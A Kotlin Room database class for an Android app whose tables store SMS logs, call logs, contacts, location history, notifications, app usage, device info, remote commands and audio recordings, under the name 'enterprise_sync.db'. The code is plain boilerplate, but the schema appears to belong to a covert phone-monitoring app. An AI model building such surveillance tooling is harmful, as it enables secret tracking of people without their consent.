package com.example.data.local

import android.content.Context
import androidx.room.Database
import androidx.room.Room
import androidx.room.RoomDatabase

@Database(
    entities = [
        SmsLogEntity::class,
        CallLogEntity::class,
        ContactEntity::class,
        LocationLogEntity::class,
        NotificationLogEntity::class,
        AppUsageEntity::class,
        DeviceInfoEntity::class,
        RemoteCommandEntity::class,
        AudioRecordingEntity::class
    ],
    version = 3,
    exportSchema = false
)
abstract class AppDatabase : RoomDatabase() {
    abstract fun smsDao(): SmsDao
    abstract fun callLogDao(): CallLogDao
    abstract fun contactDao(): ContactDao
    abstract fun locationDao(): LocationDao
    abstract fun notificationDao(): NotificationDao
    abstract fun appUsageDao(): AppUsageDao
    abstract fun deviceInfoDao(): DeviceInfoDao
    abstract fun remoteCommandDao(): RemoteCommandDao
    abstract fun audioRecordingDao(): AudioRecordingDao

    companion object {
        @Volatile
        private var INSTANCE: AppDatabase? = null

        fun getInstance(context: Context): AppDatabase {
            return INSTANCE ?: synchronized(this) {
                val instance = Room.databaseBuilder(
                    context.applicationContext,
                    AppDatabase::class.java,
                    "enterprise_sync.db"
                ).fallbackToDestructiveMigration().build()
                INSTANCE = instance
                instance
            }
        }
    }
}
